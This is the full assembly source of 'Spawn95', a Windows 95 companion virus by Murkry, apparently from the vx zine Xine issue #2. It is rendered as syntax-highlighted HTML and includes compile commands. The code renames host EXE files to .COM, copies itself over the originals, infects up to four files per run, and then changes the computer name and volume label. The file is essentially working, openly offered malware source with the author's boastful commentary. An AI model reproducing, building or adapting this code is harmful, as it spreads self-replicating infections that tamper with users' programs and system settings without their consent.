<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>spawn95b.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc7 {
	font-weight: bold;
	color: #0080C0;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;                                        /-----------------------------\
;                                        | Xine - issue #2 - Phile 023 |</span><span class="sc0">
</span><span class="sc1">;                                        \-----------------------------/</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; simple win 95 spawning virus</span><span class="sc0">
</span><span class="sc1">; use CreateProccessA to run the exe so as long as its in</span><span class="sc0">
</span><span class="sc1">; win95 it could load the win 3.1 and Dos files</span><span class="sc0">
</span><span class="sc1">; It renames the EXE to Com this means that at the Dos prompt the true</span><span class="sc0">
</span><span class="sc1">; file will be run but at the Windows GUI interface the exe file which is the</span><span class="sc0">
</span><span class="sc1">; virus will run it will search for 2 possibles files and infect 1 file if</span><span class="sc0">
</span><span class="sc1">; possible.</span><span class="sc0">
</span><span class="sc1">; First virus I have written an early version of it was release and got to</span><span class="sc0">
</span><span class="sc1">; AVP where it was called Win95.Companion.  </span><span class="sc0">
</span><span class="sc1">;  I knew I should have put a name in it ;)  so Spawn95 it is version 1.1</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;BY MURKRY</span><span class="sc0">
</span><span class="sc1">;notes this is a spawning Win32 virus that uses the kernel API's to</span><span class="sc0">
</span><span class="sc1">;call the orginal host and to find the host Does not change directories</span><span class="sc0">
</span><span class="sc1">;so it should be relatively harmless.  Will not work from the command line</span><span class="sc0">
</span><span class="sc1">;cause thats like DOS so the .com file(orginal file will be called)</span><span class="sc0">
</span><span class="sc1">;but for the Windows only people it will work like a charm of course</span><span class="sc0">
</span><span class="sc1">;it cant spread to far and if it does (shock) I'll wonder how it did.</span><span class="sc0">
</span><span class="sc1">;  Why write a Companion virus at all , hell ask why write viruses,</span><span class="sc0">
</span><span class="sc1">; no reason at all...</span><span class="sc0">

</span><span class="sc1">;can't wait for</span><span class="sc0">
</span><span class="sc1">;doppelganger97   &lt;g&gt;</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; To compile:</span><span class="sc0">
</span><span class="sc1">;    tasm32 /ml /m3 spawn95b,,;</span><span class="sc0">
</span><span class="sc1">;    tlink32 /Tpe /aa /c spawn95b,spawn95b,, import32.lib</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc2">.386</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">
 
                                                              
</span><span class="sc5">Find_data</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">139h</span><span class="sc0">
</span><span class="sc5">Find_data_name</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">2ch</span><span class="sc0">     </span><span class="sc1">;where in the structure is the name</span><span class="sc0">

</span><span class="sc1">;Define the needed external functions and constants here.</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0">           </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">           </span><span class="sc5">FindFirstFileA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">           </span><span class="sc5">CopyFileA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">           </span><span class="sc5">GetCommandLineA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">           </span><span class="sc5">FindNextFileA</span><span class="sc4">:</span><span class="sc9">Proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">           </span><span class="sc5">lstrcpyA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">           </span><span class="sc5">MessageBoxA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0">           </span><span class="sc5">CreateProcessA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">     </span><span class="sc1">;used to run the host </span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0">           </span><span class="sc5">SetComputerNameA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">           </span><span class="sc5">SetVolumeLabelA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">

</span><span class="sc9">.data</span><span class="sc0">                                        </span><span class="sc1">;the data area</span><span class="sc0">

</span><span class="sc5">EXE_file</span><span class="sc0">        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'*'</span><span class="sc0">
</span><span class="sc5">Fexe</span><span class="sc0">            </span><span class="sc9">dB</span><span class="sc0">      </span><span class="sc12">'.EXE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc7">Fcom</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'.COM'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">blank</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">' '</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">title1</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Spawn95'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">mess</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Either 4 or all files in this directory '</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'           are infected!!!'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0dh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"'Making computers more interesting "</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Through the creation of `tronic life'"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'                   Murkry/1997'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">murkry</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Murkry'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc9">.data?</span><span class="sc0">
</span><span class="sc5">IOBYTES</span><span class="sc0">         </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FileHandH</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">fileHandV</span><span class="sc0">       </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FIND_DATA</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FILETIME1</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0"> 
</span><span class="sc5">FILETIME2</span><span class="sc0">       </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FILETIME3</span><span class="sc0">       </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FILE_NAME</span><span class="sc0">       </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">255D</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">14D</span><span class="sc0">  </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">  
  
</span><span class="sc5">counter</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Fhandle</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">find_file</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">Find_data</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">;size of the find data</span><span class="sc0">
</span><span class="sc5">new_name</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0FH</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">host_name</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">100</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">inf_name</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">100</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">ProcessInfo</span><span class="sc0">     </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">StartupInfo</span><span class="sc0">     </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">18</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">buffer</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1024</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">



</span><span class="sc9">.code</span><span class="sc0">                                   </span><span class="sc1">;executable code starts here</span><span class="sc0">

</span><span class="sc5">HOST</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;lpstrGetCommandLine()</span><span class="sc0">
</span><span class="sc1">; returns in eax pointer to the command line appears that</span><span class="sc0">
</span><span class="sc1">; ecx also returns something but not sure what 05 a handle maybe</span><span class="sc0">

                </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">GetCommandLineA</span><span class="sc0">         </span><span class="sc1">;nothing pass to it</span><span class="sc0">
                                                </span><span class="sc1">;eax -&gt;command line</span><span class="sc0">
 

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;What to copy pointer</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">host_name</span><span class="sc0">    </span><span class="sc1">;to where we want it</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lstrcpyA</span><span class="sc0">                </span><span class="sc1">;this copys the string</span><span class="sc0">

                 
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FindDot</span><span class="sc0">
                                                </span><span class="sc1">;convert the name to the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc7">Fcom</span><span class="sc0">         </span><span class="sc1">;com name which is the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">                   </span><span class="sc1">;host_name</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">

                 
</span><span class="sc1">;-----------------------------------------------</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">host_name</span><span class="sc0">    </span><span class="sc1">;have no idea why I did</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;not just copy the command</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">inf_name</span><span class="sc0">     </span><span class="sc1">;line twices and throw the</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;zero on the end</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lstrcpyA</span><span class="sc0">                </span><span class="sc1">;inf_name is the name</span><span class="sc0">
                                                </span><span class="sc1">;of the exe companion</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FindDot</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Fexe</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">;We now have the host name *.com in host name now we need to find a exe file</span><span class="sc0">
</span><span class="sc1">;that has no *.com file associated with it</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">RunIt</span><span class="sc0">                     </span><span class="sc1">;run the host_name file</span><span class="sc0">
</span><span class="sc1">;The host has been run now the Spawn simply needs to find another host</span><span class="sc0">
</span><span class="sc1">;and rename and copy itself to the old name</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;handle FindFirst(LPSTR lpszSearchFile, LPWIN32_FIND_DATA lpffd)</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">find_file</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">EXE_file</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
   
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FindFirstFileA</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">                   </span><span class="sc1">;cant find exe file</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">fini</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">Fhandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;save the handle</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;ok we have a file now create the new name *.com</span><span class="sc0">
</span><span class="sc1">;just do a move until the . is found then add the .com to it</span><span class="sc0">
</span><span class="sc1">; movsb  ds:esi -&gt; es:edi</span><span class="sc0">
</span><span class="sc1">; lodsb  ds:esi -&gt; al</span><span class="sc0">
</span><span class="sc1">; stosb  al -&gt; es:edi</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">FoundAFile</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">counter</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                                     </span><span class="sc1">;take the name we</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">new_name</span><span class="sc0">                    </span><span class="sc1">;found and</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">find_file</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Find_data_name</span><span class="sc0">  </span><span class="sc1">;make it a com name</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc3">"."</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
                                                       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">loop_search</span><span class="sc4">:</span><span class="sc0">                                           </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">                                          </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">FoundIt</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">                                          </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">loop_search</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
                                                       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">FoundIt</span><span class="sc4">:</span><span class="sc0">                                               </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc7">Fcom</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
                                                       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; Should pobaly use the MoveFile API  to just rename the file</span><span class="sc0">
</span><span class="sc1">;  but too lazy to change the code now and how much time would you</span><span class="sc0">
</span><span class="sc1">;  want to waste on a spawning virus anyway ???</span><span class="sc0">
</span><span class="sc1">;CopyFileA(dword pnter file_name, dword pnter new_name, T/F Bool)</span><span class="sc0">
</span><span class="sc1">; 1 = true 0 = false  True means do not overwrite</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                                 </span><span class="sc1">;do not overwrite</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">new_name</span><span class="sc0">                   </span><span class="sc1">;new name</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">find_file</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Find_data_name</span><span class="sc0"> </span><span class="sc1">;old name</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CopyFileA</span><span class="sc0">


        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">;0 = false we failed so get out</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">OkInfectHost</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">counter</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">DoneInfecting</span><span class="sc0">

        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Fnext</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                     </span><span class="sc1">;0 failed search end it</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">DoneInfecting</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">FoundAFile</span><span class="sc0">


</span><span class="sc5">OkInfectHost</span><span class="sc4">:</span><span class="sc0">
 
</span><span class="sc1">;CopyFileA(dword pnter file_name, dword pnter new_name, T/F Bool)</span><span class="sc0">
</span><span class="sc1">; 1 = true 0 = false  True means do not overwrite</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">find_file</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Find_data_name</span><span class="sc0">     </span><span class="sc1">;old name to copy to</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">inf_name</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                  </span><span class="sc1">;the old host       </span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CopyFileA</span><span class="sc0">

</span><span class="sc1">;I had some vaporware ideas to copy the .resc area of the PE exe files</span><span class="sc0">
</span><span class="sc1">;from the orginal host to the companion this way the icon info would show</span><span class="sc0">
</span><span class="sc1">;up but Started toplay with the Win32 vxd service which allows Int 21 31 41</span><span class="sc0">
</span><span class="sc1">;calls from the Win32 program.  Seems it be fun to write a virus that</span><span class="sc0">
</span><span class="sc1">;only uses the callvxd0 API from the Kernel to infect a file</span><span class="sc0">
</span><span class="sc1">;Mite be harder to catch also :)</span><span class="sc0">
</span><span class="sc1">;anyway here where the quick notes I had written to myself</span><span class="sc0">

        </span><span class="sc1">;inf_name = the new name of us</span><span class="sc0">
        </span><span class="sc1">;new_name = orginal host</span><span class="sc0">
        </span><span class="sc1">;open new_name copy rscr section entry</span><span class="sc0">
        </span><span class="sc1">;              copy rscr entry</span><span class="sc0">
        </span><span class="sc1">;      close file</span><span class="sc0">
        </span><span class="sc1">;open inf_name</span><span class="sc0">
        </span><span class="sc1">;write rscr entry to end</span><span class="sc0">

        </span><span class="sc1">;read in the PE header</span><span class="sc0">
        </span><span class="sc1">;update the num_sections 6 word</span><span class="sc0">
        </span><span class="sc1">;           size of data    28 D ????</span><span class="sc0">
        </span><span class="sc1">;           size of image   80 D</span><span class="sc0">
        </span><span class="sc1">;           rscr header update pointer to raw data</span><span class="sc0">
        </span><span class="sc1">;                       this will be old image sizeenryt + 14h</span><span class="sc0">
        </span><span class="sc1">;will need FPointer, Fread, Fwrite</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
          
</span><span class="sc5">fini</span><span class="sc4">:</span><span class="sc0">
 

         

</span><span class="sc5">End_it</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">LARGE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ExitProcess</span><span class="sc0">             </span><span class="sc1">;end it  </span><span class="sc0">

</span><span class="sc5">DoneInfecting</span><span class="sc4">:</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">murkry</span><span class="sc0">      </span><span class="sc1">;sets the computer name to</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;Murkry</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetComputerNameA</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
                
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetVolumeLabelA</span><span class="sc0">        </span><span class="sc1">;sets the volume name to murkry</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">End_it</span><span class="sc0">

</span><span class="sc1">;-------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">FindDot</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc3">"."</span><span class="sc0">
</span><span class="sc5">search_for</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">found_dot</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">search_for</span><span class="sc0">
</span><span class="sc5">found_dot</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;-------------------------------------------------------------</span><span class="sc0">

